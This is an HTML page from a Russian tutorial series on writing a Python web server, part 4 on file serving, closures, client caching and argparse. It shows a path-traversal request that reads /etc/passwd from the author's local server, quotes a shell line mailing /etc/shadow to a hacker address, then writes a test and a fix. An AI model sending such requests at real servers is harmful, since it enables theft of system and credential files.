@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+    <head>
+        <meta charset="UTF-8">
+        <title>Ownhands by wiz</title>
+        <link rel="stylesheet" type="text/css" href="style.css">
+    </head>
+    <body>
+        <h2 class="project-name">Ownhands</h2>
+        <h4 class="project-tagline">Exported from <a href="http://code.google.com/p/ownhands">http://code.google.com/p/ownhands</a></h4>
+        <h3><a href="http://welinux.ru/user/wiz/">wiz</a></h3>
+        <h1>Серия постов для welinux</h1>
+        <a href="index.html">Оглавление</a><br>
+        <a href="part1.html">Python — Веб-сервер своими руками. Часть 1</a><br>
+        <a href="part2.html">Python — Веб-сервер своими руками. Часть 2 — наводим порядок</a><br>
+        <a href="part3.html">Python — Веб-сервер своими руками. Часть 3 — фиксим фичи, добавляем баги</a><br>
+        <a href="part4.html">Python — Веб-сервер своими руками. Часть 4 — раздача файлов</a>
+        <p><a href="https://github.com/fianitnz/ownhands" class="btn">View on GitHub</a>&nbsp<a href="https://github.com/fianitnz/ownhands/zipball/master" class="btn">Download.zip</a>&nbsp<a href="https://github.com/fianitnz/ownhands/tarball/master" class="btn">Download.tar.gz</a></p>
+        06.02.2011 15:21 from: <a href="http://welinux.ru/post/5072/">http://welinux.ru/post/5072/</a>
+        <h3>Python — Веб-сервер своими руками. Часть 4 — раздача файлов</h3>
+        <p>Переходим к более практической части. Хардкодом побаловались, далее по <a href="http://welinux.ru/post/5043/#plan">плану</a> идёт раздача файлов.</p>
+        <p>Я пока смутно представляю какой должна быть реализация, но зато примерно знаю как можно проверить её правильность. Поэтому эти знания мы сейчас выразим в виде теста, к несуществующему пока коду. Такой подход называется <a href="http://ru.wikipedia.org/wiki/%D0%A0%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%BA%D0%B0_%D1%87%D0%B5%D1%80%D0%B5%D0%B7_%D1%82%D0%B5%D1%81%D1%82%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5">Test-driven Development</a> или TDD. Тоесть мы сначала строим измеритель выхлопа, а потом уже на другом конце собираем карбюратор, соответствующий заданым параметрам (= Контринтуитивный манёвр, но частенько помогает определиться с API ещё до написания кода, который потом, во время изменения задачи придётся переписывать. А зачем делать двойную работу?</p>
+
+<p>Обработчики являются как бы плагинами к серверу, он от них никак не зависит, и поэтому должны лежать в отдельном модуле (handlers.py).</p>
+
+<code>class TestHandlers(object):
+    def setup(self):
+        self.server = HTTPServer()
+        self.client = MockClient(self.server)
+
+    def test_static(self):
+        """Раздача файлов с диска"""
+
+        self.server.register(lambda r: True, serve_static) # обслуживать все запросы как файл-сервер
+
+        eq_('404', self.client('/give-me-nice-404')[0][1])
+
+        reply, headers, body = self.client('/handlers.py') # файл из каталога сервера
+        data = open('handlers.py').read()                  # загружаем тот же файл вручную
+        eq_(body, data)                                    # проверяем содержимое
+        eq_(int(headers['CONTENT-LENGTH']), len(data))     # и заголовок с длиной, которую сервер должен нам посчитать</code>
+
+<p>Функцию serve_static надо будет импортировать в начале тестов, а в handlers.py сделать заглушку:</p>
+<code>def serve_static(request):
+    request.reply(body="your file %s is being downloaded. wait 1 minute for a link or send SMS to numer 100500")</code>
+
+<p>Тесты начнут дружно валиться, но теперь понятно что должно быть внутри функции:</p>
+<code>def serve_static(request):
+    try:
+        data = open(request.url[1:]).read()  # отрезаем начальный / из адреса и считываем файлы
+    except IOError as err:                   # если что-то не получилось, ловим ошибку
+        if err.errno == 2:                   # ничего особенного, просто нет такого файла
+            return request.reply('404', 'Not found', '%s: not found' % request.url)
+        raise                                # всё остальное - не наше дело
+    request.reply(body=data, content_length=len(data))</code>
+
+<p>Теперь всё проходит. Можно сделать «однострочный веб сервер» для раздачи файлов из текущего каталога в баше, который можно вызывать через `python -m serve`. Пока оно не установлено в пути python из любого каталога конечно не прокатит, но из возле самого сервера работать вполне будет.</p>
+<code>if __name__ == '__main__':
+    server = HTTPServer()
+    from handlers import serve_static
+    server.register(lambda _: True, serve_static)
+    server.serve()</code>
+
+<p>Запускаем, пробуем:</p>
+
+<code lang='bash'>curl http://localhost:8000/handlers.py
+def serve_static(request):
+    try:
+...</code>
+
+<p>Работает. Пробуем дальше:</p>
+
+<code lang='bash'>curl http://localhost:8000/../../../../../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+...</code>
+
+<p>Ой! К счастью сервер запущен не от рута и /etc/shadow в безопасности. Но сервер при этом жёстко крашнется:</p>
+
+<code lang='bash'>GET /../../../../../../../../../../../etc/shadow {'HOST': 'localhost:8000', 'ACCEPT': '*/*', 'USER-AGENT': 'curl/7.21.0 (x86_64-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18'}
+Traceback (most recent call last):
+...
+  File "handlers.py", line 5, in serve_static
+    data = open(request.url[1:]).read()
+IOError: [Errno 13] Permission denied: '../../../../../../../../../../../etc/shadow'</code>
+
+<p>Сразу допишем в <b>test_handlers</b> вредный тест, который будет рушить «сервер» в комфортной обстановке:</p>
+
+<code>self.server.register(lambda r: r.url == '/crash/me/', lambda r: no_you)
+eq_('500', self.client('/crash/me/')[0][1])</code>
+<p>Тесты начали фэйлиться с «NameError: global name 'no_you' is not defined». Замечательно, то что нужно.</p>
+
+<p>В каждом хэндлере всех ошибок не отловишь, да и полагаться на их будущих авторов тоже не стоит. «Хочешь чтобы было хорошо — сделай это сам!». Где у нас есть место, в котором можно раз и навсегда защитить сервер от крашей по причине ошибок хэндлеров? Они вызываются из диспетчера <b>on_request</b>, пристегнём его try-мнями безопасности:</p>
+<code>try:  # всё что далее, под защитой
+    for pattern, handler in self.handlers:
+        if pattern(request):
+            handler(request)
+            return True
+except Exception as err:                                              # ловим все ошибки
+    request.reply('500', 'Infernal server error', 'Ай нанэ-нанэ...')  # и сообщаем в ответе
+    return False  # обязательно заканчиваем выполнение после request.reply чтобы не слать уже в закрытое соединение
+# соединение закрыто, сервер продолжает свою работу</code>
+<p>Конечно, это не защитит от всяких фатальных ошибок типа вызывающих core dump, но уже что-то. Тесты теперь ловят свой законный «груз 500», но человек, заглянувший браузером останется в непонятках и будет зол. Особенно если это сам разработчик в поисках проблемы. Питон позволяет не просто отлавливать код и сообщение ошибки, но и ситуацию, в которой она возникла. А заполучить это нам поможет штатный модуль <b>traceback</b>.</p>
+
+<p>Сделаем более детальный тест:</p>
+<code>request, headers, body = self.client('/crash/me/')
+eq_(request[1], '500')
+assert 'NameError' in body, body</code>
+
+<p>Выражение assert это способ языка проверить очень-важное-условие. <b>assert False</b> — всегда будет вызывать исключение AssertionError. А чтобы сразу было видно, что не понравилось условию, вторым «аргументом» assert идёт тело ответа. Прямо сейчас нам оттуда просто выражают сожаление, но ничего конкретного не сообщают.</p>
+
+<p>Немного изменим обработку ошибки:</p>
+<code>request.reply('500', 'Infernal server error', traceback.format_exc())</code>
+
+<p>curl стал показывать трейсбек и ошибку, что значительно облегчит написание и отладку обработчиков:</p>
+<code lang='bash'>...
+  File "handlers.py", line 5, in serve_static
+    data = open(request.url[1:]).read()
+IOError: [Errno 13] Permission denied: '../../../../../../../../../../../etc/shadow'</code>
+
+<p>Этому хаку уже <s>сто лет</s> <a href="http://ru.wikipedia.org/CERN_httpd">21 год</a> в обед и нам ещё повезло, что open не умеет выполнять команды внутри скобок типа `mail hacker@dot.org < /etc/shadow` и прочие шелловские штучки, которым были подвержены в детском возрасте многие демоны. Но всё же, даже такая штука весьма неприятна даже если сервер запущен от nobody:nogroup.</p>
+
+<p>Сегодня — день TDD, поэтому сразу заготавливаем проверку. Это уже не для сервера в целом, а для конкретного хэндлера, поэтому и отправляется в его набор <b>test_static</b>:</p>
+<code>eq_('404', self.client('/../../../../../../../../../../../etc/passwd')[0][1])</code>
+
+<p>Убедившись, что nosetests выдаёт наш «законный» AssertionError: '404' != '200', отправляемся писать фикс.</p>
+
+<p>В библиотеке <b>os.path</b> есть много интересных функций, поэкспериментировав с которыми можно найти одну, которая выдаёт, что указаный путь выходит за уровень начального:</p>
+<code>from os.path import relpath
+
+def serve_static(request):
+    path = request.url[1:]              # сразу отрезаем кусочек из урла, он нам дальше ещё везде пригодится
+    if relpath(path).startswith('..'):  # побег! аларм!
+        return request.reply('404', 'Not found', '%s: not found' % path)  # отказываемся обслуживать запрос</code>
+
+<p>Что-то я уже подзадолбался писать «return request.reply()», тем более, что сервер в итоге и так ещё потом пытается ловить ошибки. А ведь 4хх и 5хх это именно ошибки и есть. Вынесем их в отдельный класс исключений, которые затем можно будет везде бросать и ловить:</p>
+
+<code>class HTTPError(Exception):
+    pass</code>
+
+<p>И всё. Остальные могут его импортировать и пользоваться. Сделаем для него специальный способ обработки в диспетчере:</p>
+<code>...
+except HTTPError as error:
+    err_code = error.args[0]  # передаём код ошибки в аргументе исключения
+    reply = {             # сообщения стандартные
+        404: 'Not found',
+        403: 'Permission denied',
+    }[err_code]               # питонский аналог switch/case
+    request.reply(str(err_code), reply, "%s: %s" % (reply, request.url)) # формируем ответ
+    return False                                                         # и отваливаемся
+...</code>
+
+<p>После перевода ошибок на рельсы HTTPError оставшиеся ошибки из файловой системы транслируются в коды HTTP достаточно <a href="https://code.google.com/p/ownhands/source/browse/04/handlers.py?spec=svn518f8d47959631f7ae58e888490b7068bf36d64d&r=518f8d47959631f7ae58e888490b7068bf36d64d">тривиально</a>.</p>
+
+<p>Выдавать файлы из текущего каталога это забавно, но хочется всё же указать привычный /var/www, а может даже не один. Тоесть понадобится система альясов url → path, а значит нужна связь между паттерном и хэндлером. Можно было бы сделать специальный класс с конструктором (url, root) и методами pattern & handler, которые через экземпляр класса бы знали свои начальные параметры. Но «объекты это <a href="http://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BC%D1%8B%D0%BA%D0%B0%D0%BD%D0%B8%D0%B5_(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%B8%D1%80%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5)#Python">замыкания</a> для бедных» © <a href="ftp://ftp.cs.indiana.edu/pub/scheme-repository/doc/pubs/swob.txt">Norman Adams</a>. Действительно, зачем городить целый класс, потом создавать его экземпляр, потом брать его методы и засовывать в сервер, когда нам нужно всего лишь объединить <a href="http://ru.wikipedia.org/wiki/%D0%9E%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C_%D0%B2%D0%B8%D0%B4%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8">область видимости</a> уже готовой функции с паттерном, который отловит соответствующий URL.</p>
+
+<p>Первым делом, первым делом — юнит тесты... Завернём раздатчик статики так, чтобы функция выдавала две других функции и передадим это хозяйство через развёртывание позиционных аргументов:</p>
+<code>self.server.register(*serve_static('/', '.'))</code>
+<p>Ровно тоже самое, что и было: все урлы раздаются из текущего каталога.</p>
+
+<p>Нынешнюю serve_static переименуем в handler и завернём внутрь новой serve_static(url, root):</p>
+<code>def serve_static(url, root):
+    def handler(request):
+        ...</code>
+
+<p>Теперь у нас есть создание функции внутри другой функции. При этом изнутри <b>handler</b> будут доступны также ещё url и root из «родительской функции». Добавим паттерн и возврат двух свежесозданных функций:</p>
+<code>def serve_static(url, root):
+    cut = len(url)  # сразу подсчитаем сколько надо отрезать от url для преобразования в путь относительно root
+
+    def pattern(request):
+        return request.url.startswith(url)
+
+    def handler(request):
+        path = "%s/%s" % (root, request.url[cut:])  # превращаем путь из URL в путь на ФС
+        ...
+
+    return pattern, handler</code>
+<p>Замыкания потому так и называются, что, после того, как возврат произведён, всё состояние как бы перестаёт существовать, как река, в которую нельзя войти дважды. Но функции, созданные (они на самом деле создаются на ходу - можете проверить их id) продолжают иметь доступ к этому «висящему в пустоте» контексту и всем его переменным. Поэтому единожды посчитаная длина базового URL продолжает оставаться доступной для всего кода порождённого внутри.</p>
+
+<p>Тесты как обычно показывают, что код в порядке и при переезде ничего не отломилось.</p>
+
+<p>Другой важной задачей файлого сервера, помимо отдавания файлов, является... не-отдавание файлов когда это возможно. Это называется «кэш на стороне клиента» и обеспечивается с помощью пары заголовков If-Modified-Since/Last-Modified и кода HTTP 304: Not modified.</p>
+
+<p>Для того чтобы договориться о том, что надо или не надо передавать содержимое файла сервер посылает заголовок Last-Modified с датой последнего изменения по GMT в формате RFC1123: '%a, %d %b %Y %H:%I:%S GMT'. Чтобы получить эту дату (и ещё другие вещи, которые тоже пригодятся) используем <b>os.stat</b>:</p>
+<code>>>> os.stat('./handlers.py')
+posix.stat_result(st_mode=33188, st_ino=10881370L, st_dev=2097L, st_nlink=1, st_uid=1000, st_gid=1000, st_size=860L, st_atime=1296987898, st_mtime=1296987898, st_ctime=1296987898)</code>
+<p>Отсюда нам интересны st_mtime (время изменения), st_size (размер) и st_mode (вдруг это не файл вообще). Если такого узла в файловой системе не будет, возникнет исключение OSError/2 (а не, IOError, как в случае с open). С каталогами мы разберёмся в следующей части, а дата и размер берутся достаточно легко.</p>
+<code>try:
+    stat = os.stat(path)                                                # собираем информацию
+    mod_time = time.strftime(DATE_RFC1123, time.gmtime(stat.st_mtime))  # форматируем время
+    data = open(path).read()                                            # пока что продолжаем читать содержимое
+except (OSError, IOError) as err:  # ловим сразу несколько исключений
+    ...
+request.reply(body=data, content_length=stat.st_size, last_modified=mod_time)  # размер берём сразу из stat, добавляем дату</code>
+
+<p>Клиент, увидев дату, запомнит её и в следующий раз отправит вместе с запросом в заголовке If-Modified-Since, который надо распарсить и сравнить с датой файла. Сразу оформим это в виде теста:</p>
+<code> # ... предыдущий запрос к handlers.py ... #
+reply, headers, body = self.client('/handlers.py', if_modified_since=headers['LAST-MODIFIED'])
+eq_(reply, ['HTTP/1.0', '304', 'Not modified'])
+eq_(body, '')</code>
+
+<p>И сделаем закорачивание обработки сразу после stat:</p>
+<code>if 'IF-MODIFIED-SINCE' in request.headers:
+    try:
+        request_mtime = time.mktime(time.strptime(request.headers['IF-MODIFIED-SINCE'], DATE_RFC1123))
+    except ValueError:
+        request_mtime = None                             # в заголовках мусор
+    if request_mtime and request_mtime < stat.st_mtime:
+        return request.reply('304', 'Not modified', '')  # сам файл уже не читаем</code>
+
+<p>Вот и всё. Осталось починить дефолтный сервер, а заодно добавить немного настроек.</p>
+
+<p>В python 2.7 появился очередной модуль разбора аргументов командной строки <b>argparse</b>, который довольно неплох. Для предыдущих версий его можно поставить из pip. А можно и не ставить и сделать так, чтобы сервер запускался и без него. <b>import</b> ничем не хуже других инструкций питона и бросает самые обычные исключения, которые можно просто отловить и обойти.</p>
+<code>if __name__ == '__main__':
+    from handlers import serve_static
+
+    port, root = 8000, '.'  # значения по-умолчанию
+
+    try:
+        import argparse
+        parser = argparse.ArgumentParser()
+        options = parser.parse_args()
+    except ImportError:
+        pass  # нету, и не очень-то и хотелось...
+
+    server = HTTPServer(port=port)
+    server.register(*serve_static('/', root))
+    server.serve()</code>
+
+<p>Код теперь попытается разобрать командную строку и скромно откажется принимать какие-либо аргументы кроме --help/-h. Допишем разбор порта и корневого каталога для раздачи:<p/>
+<code>parser.add_argument('--port', nargs='?', type=int, default=port)  # преобразуем аргумент сразу к типу int
+parser.add_argument('--root', nargs='?', type=str, default=root)  # str не обязательно, они и так будут строками
+options = parser.parse_args()
+port, root = options.port, options.root                           # вытаскиваем улов</code>
+
+<p>Формат очень простой: полное имя переменной (короткое он сам сделает), количество аргументов (? - один необязательный, * - много необязательных или фиксированое число), в какой тип преобразовывать (если надо) и значение по-умолчанию (None, если не указывать). Там есть ещё другие интересные опции, но этих нам хватит. Если полное имя написать без «--», то получится позиционный аргумент.</p>
+
+<p>Результаты регистрации аргументов можно посмотреть вызывав справку:</p>
+<code lang='bash'>$ python -m serve -h
+usage: serve.py [-h] [--port [PORT]] [--root [ROOT]]
+
+optional arguments:
+  -h, --help     show this help message and exit
+  --port [PORT]
+  --root [ROOT]</code>
+
+<p>Даже такая, казалось бы, простейшая задача содержит предостаточно подводных граблей и возможностей хвастнуть питоном. В следующей статье мы обкатаем ещё несколько важных особенностей сервера, протоколов и питона.</p>
+
+<p>(<a href="http://code.google.com/p/ownhands/source/browse/#hg%2F04%253Fstate%253Dclosed">весь код в сборе</a>)</p>
